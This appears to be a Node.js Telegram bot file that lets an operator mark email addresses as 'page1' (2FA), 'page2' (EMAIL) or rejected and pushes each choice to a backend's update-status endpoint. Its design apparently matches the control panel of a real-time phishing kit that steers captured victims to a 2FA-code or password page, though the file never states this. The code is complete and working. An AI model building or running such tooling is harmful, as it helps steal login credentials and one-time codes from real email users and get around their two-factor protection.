const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL");
  process.exit(1);
}

// ============================================================================
// 🤖 BOT INITIALIZATION
// ============================================================================

const bot = new TelegramBot(BOT_TOKEN, {
  polling: {
    autoStart: true,
    params: { timeout: 10 }
  }
});

bot.getMe().then(() => {
  console.log(`✅ Bot connected`);
}).catch(err => {
  console.error("❌ Bot connection failed:", err.message);
});

// ============================================================================
// 🔘 CALLBACK HANDLERS
// ============================================================================

const handledCallbacks = new Set();

bot.on("callback_query", async (query) => {
  const callbackId = query.id;
  
  if (handledCallbacks.has(callbackId)) {
    return;
  }
  handledCallbacks.add(callbackId);

  try {
    const data = query.data;
    const [action, email] = data.split("|");

    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : "REJECT"}`);

    // Update status via backend
    const response = await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: email,
        status: action
      })
    });

    if (response.ok) {
      // ============================================================================
      // 📝 EDIT ORIGINAL MESSAGE - REMOVE BUTTONS
      // ============================================================================

      try {
        const botToken = BOT_TOKEN;
        const chatId = ADMIN_CHAT_ID;
        const messageId = query.message?.message_id;
        const originalText = query.message?.text;
        
        if (messageId && originalText) {
          const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
          await fetch(editUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: messageId,
              text: originalText,
              parse_mode: "HTML"
            })
          });
        }
      } catch (err) {
        console.error(`Error editing message:`, err.message);
      }

      // ============================================================================
      // 📢 SEND STATUS REPLY MESSAGE
      // ============================================================================

      let statusMessage = "";
      if (action === "page1") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page2") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "reject") {
        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
      }

      try {
        const botToken = BOT_TOKEN;
        const chatId = ADMIN_CHAT_ID;
        
        const replyUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await fetch(replyUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: statusMessage,
            parse_mode: "HTML"
          })
        });
      } catch (err) {
        console.error(`Error sending status:`, err.message);
      }
    }

    // Acknowledge callback
    bot.answerCallbackQuery(callbackId, {
      text: `✅ ${action.toUpperCase()}`,
      show_alert: false
    }).catch(() => {});

  } catch (err) {
    console.error("❌ Callback error:", err.message);
    bot.answerCallbackQuery(query.id, {
      text: "❌ Error",
      show_alert: true
    }).catch(() => {});
  }
});

console.log(`✅ Bot ready`);

module.exports = { bot };
